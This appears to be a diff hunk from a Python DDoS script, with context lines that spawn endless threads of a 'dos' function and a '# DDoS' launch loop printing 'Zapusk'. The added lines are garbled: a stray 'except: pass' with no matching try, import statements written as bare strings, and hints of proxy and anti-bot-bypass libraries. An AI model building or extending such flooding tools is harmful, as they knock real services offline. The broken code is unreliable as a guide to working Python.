@@ -47,7 +47,27 @@ def dos():
   
 while True:
  threading.Thread(target=dos).start()
-
+except:
+            pass
+"response.text"
+# Stats
+sent = 0
+error = 0
+#packets
+"import httpx"
+"import pystyle"
+"import socks"
+"import pysocks"
+"import requests"
+"import icmplib"
+"import dnspython"
+"import cloudscraper"
+"import colorama"
+"import shutup"
+"import undetected_chromedriver"
+"import psutil"
+"import flask"
+"import wget"
 # DDoS
 print(  "Zapusk")
 while True:
